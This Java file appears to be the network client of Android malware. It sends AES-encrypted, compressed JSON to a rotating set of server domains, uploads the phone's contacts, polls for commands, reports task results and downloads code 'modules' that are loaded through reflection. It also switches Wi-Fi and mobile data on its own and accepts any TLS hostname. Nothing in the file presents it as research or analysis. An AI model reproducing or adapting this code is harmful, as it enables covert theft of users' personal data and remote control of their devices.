package com.moonny.api;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;

import com.moonny.Modules;
import com.moonny.Tasks;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.IDUtility;
import com.moonny.helpers.Utils;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ClientConnectionManager;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.conn.HttpHostConnectException;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.conn.ssl.SSLSocketFactory;
import org.apache.http.entity.AbstractHttpEntity;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.apache.http.protocol.HTTP;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.URI;
import java.security.KeyStore;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.Deflater;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

/*

Usage examples:

- request data:
        JSONObject json = new JSONObject();
        try {
            json.put(S.api_method, S.api_contacts); // type
            json.put(S.api_contacts_list, Utils.getContacts(ctx)); // data
        } catch (JSONException e) {
            e.printStackTrace();
            // process fail
        }

- callback example:
        Callback clb = new Callback() {

            public void callb(RequestResult result) {
                Log.d("Api2", "CALLBACK server response: code: " + result.getCode() +"; data: " + result.getResponse());
            }
        };

- call with callback
        new ApiRequest(ctx, json, clb).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);

- call without callback
        new ApiRequest(ctx, json, null).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);

- call api from dynamic module
        Modules.main(this, "apiTest", new Object[]{});

        constructor of module:
            private Method api_request;
            this.api_request = mods.getClass().getDeclaredMethod((String) system.get("a7"), JSONObject.class, String.class, String.class);

        function apiTest in Main module:

            JSONObject phones = new JSONObject();
            phones.put("vasya", "+7555000666");

            JSONObject json = new JSONObject();
            json.put("m", "x"); // type
            json.put("1", phones); // data

            api_request.invoke(mods, json, "", "");

- call api from dynamic module with callback
        Modules.main(this, "apiTestWithCallback", new Object[]{});

        constructor of module:
            private Method api_request;
            this.api_request = mods.getClass().getDeclaredMethod((String) system.get("a7"), JSONObject.class, String.class, String.class);

        function apiTestWithCallback in module:

            JSONObject phones = new JSONObject();
            phones.put("vasya", "+755500-CALLME");

            JSONObject json = new JSONObject();
            json.put("m", "x"); // type
            json.put("1", phones); // data

            api_request.invoke(mods, json, "main", "apiTestCallback");

        function apiTestCallback in module (callback):

            Log.d("Api2", "MAIN CALLBACK TEST: code " + code + "; result text: " + result);

 */

public class ApiRequest extends AsyncTask<Void, Integer, RequestResult> {

    protected String URL;
    private Context ctx;
    private List<String> API_URLS = new ArrayList<>();
    private JSONObject json;
    private Callback clb;

    protected boolean BINARY_MODE = false; // download as file
    protected File BINARY_FILE = null; // file to save binary data; success response will be S.ok ("OK")

    public ApiRequest(Context context, JSONObject json, Callback clb) {
        super();
        init(context, json, clb);
    }

    public ApiRequest(Context context, JSONObject json) {
        super();
        init(context, json, null);
    }

    public ApiRequest(Context context) {
        super();
        init(context, null, null);
    }

    public void setJson(JSONObject json) {
        this.json = json;
    }

    public void setBinaryMode(String save_to_path)
    {
        BINARY_MODE = true;
        BINARY_FILE = new File(save_to_path);
    }

    private void init(Context context, JSONObject json, Callback clb)
    {
        this.ctx = context;
        this.json = json;
        this.clb = clb;
        BINARY_MODE = false;
        BINARY_FILE = null;

        URL = Constant.getDomains(context);

        if(URL.contains("|"))
        {
            String[] urls = URL.split("\\|");
            for (String url : urls) {
                if(url.startsWith(S.http)) {
                    API_URLS.add(url);
                    if(Constant.DEBUG) Log.d("ApiRequest", "API URL " + url + " added");
                }
            }
        }else {
            API_URLS.add(URL);
        }
    }
    @Override
    protected RequestResult doInBackground(Void... params) {
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        RequestResult result;

        for (int i = 0; i < Constant.API_TRIES; i++) {

            int conn_type = get_connection_type(cm);

            // CLEAR
            result = request();
            if (result.getCode() == 200)
                return result;

            // TO SKIP BROKEN WIFI
            // no connection, but wi-fi is enabled - try to disable wi-fi
            if (result.getCode() == -2 && conn_type == ConnectivityManager.TYPE_WIFI) {
                disable_wifi_data();

                result = request();
                if (result.getCode() == 200)
                    return result;
            }

            // TO ENABLE MOBILE IF DISABLED
            // no connection, not wifi, try to enable mobile
            if (result.getCode() == -2 && conn_type != ConnectivityManager.TYPE_WIFI) {
                enable_mobile_data(cm);
                Utils.threadSleep(5000);

                result = request();
                if (result.getCode() == 200)
                    return result;
            }

            // TRY WIFI TOO
            if (result.getCode() == -2 && conn_type != ConnectivityManager.TYPE_WIFI) {
                enable_wifi_data(cm);
                Utils.threadSleep(5000);
                
                result = request();
                if (result.getCode() == 200)
                    return result;
            }

            Utils.threadSleep(5000); // waits for next ass adventures
            continue;
        }

        return new RequestResult();
    }

    // Save failed task (except Get_command) to file queue to repeat later
    @Override
    protected void onPostExecute(RequestResult result) {

        String api_method = "";
        int task_id = 0; // for send_result
        String module_name = ""; // for get_module

        try {
            api_method = json.getString(S.api_method);

            if(api_method.equals(S.api_send_result))
                task_id = json.getInt(S.api_task_id);

            if(api_method.equals(S.api_get_module))
                module_name = json.getString(S.api_module);

        }catch (JSONException e){
            if(Constant.DEBUG) {
                Log.e("Api2", e.getMessage());
                e.printStackTrace();
            }
        }

        // если результат != -1 - выполняем колбэк (если есть) и завершаем
        if(result.getCode() >= 0)
        {
            if(clb != null)
                clb.callb(result);
            return;
        }

        // либо помещаем в очередь на повтор
        boolean skip_repeat = false;

        // если это запрос на новые команды
        if(api_method.equals(S.api_get_command))
            skip_repeat = true;

        Tasks queue = new Tasks(ctx, S.api_queue_file);

        // if skip still is false
        if(skip_repeat == false && (!module_name.isEmpty() || task_id > 0)) {

            String[] queue_elems = queue.get_all();
            for (String q_elem : queue_elems) {

                try {
                    JSONObject elem_json = new JSONObject(q_elem);
                    JSONObject json = elem_json.getJSONObject(S.api_failed_json);

                    if(json.has(S.api_method)) {
                        String elem_method = json.getString(S.api_method);

                        // если скачивание модуля - проверить в конфиге нет ли там уже этого по имени модуля
                        if (elem_method.equals(S.api_get_module) && !module_name.isEmpty())
                        {
                            String elem_module_name = json.getString(S.api_module);
                            if(elem_module_name.equals(module_name))
                            {
                                skip_repeat = true;
                                if(Constant.DEBUG) Log.d("Api2", "Module request " + module_name + " ALREADY in queue");
                                break;
                            }

                            // если отправка результата - проверяем по ид
                        }else if(elem_method.equals(S.api_send_result) && task_id != 0) {
                            int elem_task_id = json.getInt(S.api_task_id);
                            if(elem_task_id == task_id)
                            {
                                skip_repeat = true;
                                if(Constant.DEBUG) Log.d("Api2", "send result request tid #" + elem_task_id + " ALREADY in queue");
                                break;
                            }
                        }
                    } // if has api_method

                } catch (Exception e) {
                    if (Constant.DEBUG) {
                        Log.e("Api2", e.getMessage());
                        e.printStackTrace();
                    }
                }
            }
        }

        // if request is failed all times and it's not just simple ping for a new tasks
        if(skip_repeat)
        {
            if(clb != null)
                clb.callb(result);
            return;
        }

        if(Constant.DEBUG) Log.d("ApiRequest", "Unfinished task saving to queue; JSON:" + json.toString());

        JSONObject obj = new JSONObject();
        try {
            obj.put(S.api_failed_json, json);
            obj.put(S.api_binary_path, (BINARY_MODE)? BINARY_FILE.getAbsolutePath() : "");
            queue.queue_add(obj.toString());
        }catch (JSONException e){
            if(Constant.DEBUG) Log.d("ApiRequest", "can't put unfinished tasks to json");
        }
    }

    // =================================== simple work ====================

    protected boolean enable_mobile_data(ConnectivityManager cm)
    {
        if (Build.VERSION.SDK_INT >= 21) {
            // log: mobile is not present on lollipop
            if(Constant.DEBUG) Log.e("Api2", "NET: enable_mobile_data is not exists on 5.0 and higher");
            return false;
        }

        if(Constant.DEBUG) Log.e("Api2", "NET: enabling mobile data");
        try {
            Method setMobileDataEnabledMethod = ConnectivityManager.class.getDeclaredMethod(S.setMobileDataEnabled, boolean.class);
            setMobileDataEnabledMethod.setAccessible(true);
            setMobileDataEnabledMethod.invoke(cm, true);

        }catch(Exception e){
            if(Constant.DEBUG) {
                // java.lang.NoSuchMethodException: setMobileDataEnabled [boolean]
                Log.e("Api2", "NET exception: " + e.getMessage());
                e.printStackTrace();
            }
        }

//        for(int i = 0; i < 5; i++)
//        {
//            if(get_connection_type(cm) != 0)
//                return true;
//
//            Utils.threadSleep(5000);
//            if(Constant.DEBUG) Log.e("Api2", "NET: waiting for mobile connection");
//        }
//
//        return false;
        return true;
    }

    protected void disable_mobile_data(ConnectivityManager cm)
    {
        if (Build.VERSION.SDK_INT >= 21) {
            // log: mobile is not present on lollipop
            if(Constant.DEBUG) Log.e("Api2", "NET: enable_mobile_data is not exists on 5.0 and higher");
            return;
        }

        if(Constant.DEBUG) Log.e("Api2", "NET: disabling mobile data");
        try {
            Method setMobileDataEnabledMethod = ConnectivityManager.class.getDeclaredMethod(S.setMobileDataEnabled, boolean.class);
            setMobileDataEnabledMethod.setAccessible(true);
            setMobileDataEnabledMethod.invoke(cm, false);

        }catch(Exception e){
            if(Constant.DEBUG) {
                // java.lang.NoSuchMethodException: setMobileDataEnabled [boolean]
                Log.e("Api2", "NET mobile exception: " + e.getMessage());
                e.printStackTrace();
            }
        }
    }

    protected void disable_wifi_data()
    {
        WifiManager wifiManager = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifiManager.setWifiEnabled(false);
    }

    protected boolean enable_wifi_data(ConnectivityManager cm)
    {
        WifiManager wifiManager = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        if(Constant.DEBUG) Log.e("Api2", "NET: enabling wifi data");
        if (!wifiManager.isWifiEnabled())
            wifiManager.setWifiEnabled(true);

//        for(int i = 0; i < 5; i++)
//        {
//            if(wifiManager.isWifiEnabled())
//                return true;
//
//            Utils.threadSleep(5000);
//            if(Constant.DEBUG) Log.e("Api2", "NET: waiting for wifi connection");
//        }
//
//        wifiManager.setWifiEnabled(false);
//        return false;
        return true;
    }

    // present only in debug mode
    protected void show_log(String URL, String scheme, int port, JSONObject jsonObject)
    {
        String conn_type;

        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = cm.getActiveNetworkInfo();

        if (info == null)
            conn_type = "null";
        else
            switch(info.getType())
            {
                case(ConnectivityManager.TYPE_WIFI):
                    conn_type = "wi-fi"; break;
                case(ConnectivityManager.TYPE_MOBILE):
                    conn_type = "mobile"; break;
                case(ConnectivityManager.TYPE_MOBILE_DUN):
                    conn_type = "mobile_dun"; break;
                case(ConnectivityManager.TYPE_MOBILE_HIPRI):
                    conn_type = "mobile_hipri"; break;
                case(ConnectivityManager.TYPE_MOBILE_MMS):
                    conn_type = "mobile_mms"; break;
                case(ConnectivityManager.TYPE_MOBILE_SUPL):
                    conn_type = "mobile_supl"; break;
                case(ConnectivityManager.TYPE_ETHERNET):
                    conn_type = "ethernet"; break;
                case(ConnectivityManager.TYPE_VPN):
                    conn_type = "vpn"; break;
                case(ConnectivityManager.TYPE_WIMAX):
                    conn_type = "wimax"; break;
                default:
                    conn_type = "unknown:" + String.valueOf(info.getType());
            }

        String apps_orig = "";
        if(jsonObject.has("2")) {

            try {
                apps_orig = jsonObject.getString("2");
                jsonObject.put("2", apps_orig.split("\\|")[0] + "|DEBUG_CUT");
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        Log.d("Api2", String.format("[%s:%s] [%s] Do request to the URL %s; JSON: %s",
                scheme,
                port,
                conn_type,
                URL,
                jsonObject.toString()
        ));

        if(!apps_orig.isEmpty()) {
            try {
                jsonObject.put("2", apps_orig);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

    }

    public int get_connection_type(ConnectivityManager cm) {

        NetworkInfo info = cm.getActiveNetworkInfo();

        if (info != null && info.isConnectedOrConnecting())
            return info.getType();

        return 0;
    }

    protected void compressEntity(String content, HttpPost request)
    {
        String tmp = Utils.aes_encrypt(content, Utils.md5(S.api_header_value));
        if(tmp != null)
            content = tmp;

        try {

            byte[] data = content.getBytes(S.utf8);

            request.setHeader(S.contentEncoding, S.gzip);

            ByteArrayOutputStream arr = new ByteArrayOutputStream();
            OutputStream zipper = new GZIPOutputStream(arr){
                {
                    this.def.setLevel(Deflater.BEST_COMPRESSION);
                }
            };

            zipper.write(data);
            zipper.close();

            AbstractHttpEntity entity = new ByteArrayEntity(arr.toByteArray());
            entity.setContentEncoding(S.gzip);
            request.setEntity(entity);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    protected RequestResult request() {

        RequestResult res = null;
        String lastApiServer = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.last_api_server, "" });
        if(lastApiServer == null)
            lastApiServer = "";

        List<String> urls;
        boolean lastUsedSet = false;
        if(lastApiServer.isEmpty())
            urls = new ArrayList<>(API_URLS);
        else {
            urls = new ArrayList<>();
            urls.add(lastApiServer);
            lastUsedSet = true;
        }

        try {
            json.put(S.api_tag, Constant.BUILD);
            json.put(S.api_id, IDUtility.getID(ctx));
        }catch (JSONException e){
            if(Constant.DEBUG)
            {
                Log.d("Api2", "JSON Exception: " + e.getMessage());
                e.printStackTrace();
            }

            return new RequestResult(); // request failed
        }

        for(String URL : urls) {

            try {

                SchemeRegistry registry = new SchemeRegistry();
                URI uri = new URI(URL);
                int custom_port = uri.getPort();
                String scheme = uri.getScheme();
                if(scheme == null)
                {
                    if(Constant.DEBUG) Log.e("Api2", "Wrong URL: " + URL);
                    continue;
                }

                int port = (custom_port != -1) ? custom_port : 80;

                // SSL
                if (scheme.equals(S.https)) {

                    port = (custom_port != -1) ? custom_port : 443;
                    KeyStore trustStore = KeyStore.getInstance(KeyStore
                            .getDefaultType());
                    trustStore.load(null, null);

                    MySSLSocketFactory sf = new MySSLSocketFactory(trustStore);
                    sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);
                    registry.register(new Scheme(scheme, sf, port));
                } else {
                    PlainSocketFactory sf = PlainSocketFactory.getSocketFactory();
                    registry.register(new Scheme(scheme, sf, port));
                }

                if (Constant.DEBUG)
                    show_log(URL, scheme, port, json);

                HttpPost httpRequest = new HttpPost(URL);
                //Special header for API access: Cache-Control: not-cache
                httpRequest.setHeader(S.api_header, S.api_header_value);
                compressEntity(json.toString(), httpRequest);

                HttpParams httpParameters = new BasicHttpParams();

                HttpConnectionParams.setConnectionTimeout(httpParameters, 60 * 1000);
                HttpConnectionParams.setSoTimeout(httpParameters, 60 * 1000);
                HttpProtocolParams.setVersion(httpParameters, HttpVersion.HTTP_1_1);
                HttpProtocolParams.setContentCharset(httpParameters, HTTP.UTF_8);

                ClientConnectionManager ccm = new ThreadSafeClientConnManager(
                        httpParameters, registry);
                // end SSL

                HttpClient httpClient = new DefaultHttpClient(ccm, httpParameters);

                HttpResponse response = httpClient.execute(httpRequest);

                int code = response.getStatusLine().getStatusCode();
                if (code == 404) {
                    throw new Exception(S.error404);
                } else if (code == 502) {
                    throw new Exception(S.error502); // country blocked
                }

                if (BINARY_MODE) {
                    if (BINARY_FILE != null) {
                        BufferedOutputStream buffOut = new BufferedOutputStream(new FileOutputStream(BINARY_FILE));
                        response.getEntity().writeTo(buffOut);
                        buffOut.close();

                        if (Constant.DEBUG) Log.d("Api2", "File downloaded");
                        res = new RequestResult(code, S.ok);
                    }

                    // clear for next requests
                    BINARY_MODE = false;
                    BINARY_FILE = null;

                } else {  // text mode

                    InputStream instream = response.getEntity().getContent();
                    Header contentEncoding = response.getFirstHeader(S.contentEncoding);
                    if (contentEncoding != null && contentEncoding.getValue().equalsIgnoreCase(S.gzip)) {

                        instream = new GZIPInputStream(instream);
                    }

                    BufferedReader reader = new BufferedReader(new InputStreamReader(instream));
                    String result = "";
                    String line;
                    while ((line = reader.readLine()) != null) {
                        result += line;
                    }

                    // DECRYPT AES
                    result = Utils.aes_decrypt(result, Utils.md5(S.api_header_value));

                    if (Constant.DEBUG) Log.d("Api2", result);
                    res = new RequestResult(code, result);
                }

                Modules.main(ctx, S.set_pref, new Object[]{ S.last_api_server, URL }) /* Prefs-Manager.set(context, S.last_api_server, URL) */; // save good url to lastApi
                break; // request is done!

            }catch (ConnectTimeoutException e){
                if(Constant.DEBUG)
                {
                    Log.d("Api2", "ERROR: TIMEOUT_EXCEPTION_NO_INTERNET_CONNECTION " + e.getMessage());
                    e.printStackTrace();
                }
                return new RequestResult(-2);

            }catch (HttpHostConnectException e){

                if(Constant.DEBUG)
                {
                    Log.d("Api2", "ERROR: HTTP_HOST_NO_INTERNET_CONNECTION " + e.getMessage());
                    e.printStackTrace();
                }
                return new RequestResult(-2);

            } catch (Exception e) {
                if(lastUsedSet) // if lastUsed was got from Prefs but failed - remove it to check all domains next time
                    Modules.main(ctx, S.set_pref, new Object[]{ S.last_api_server, "" }) /* Prefs-Manager.set(context, S.last_api_server, "") */;

                if(Constant.DEBUG)
                {
                    Log.d("Api2", "ERROR: " + e.getMessage());
                    e.printStackTrace();
                }
                //return new RequestResult();
                continue;
            }
        }

        if(res != null) {
            if(Constant.DEBUG) Log.d("Api2", "Request is OK");
            return res;
        }else {
            if(Constant.DEBUG) Log.d("Api2", "Request failed on all URLs");
            return new RequestResult();
        }
    }


}
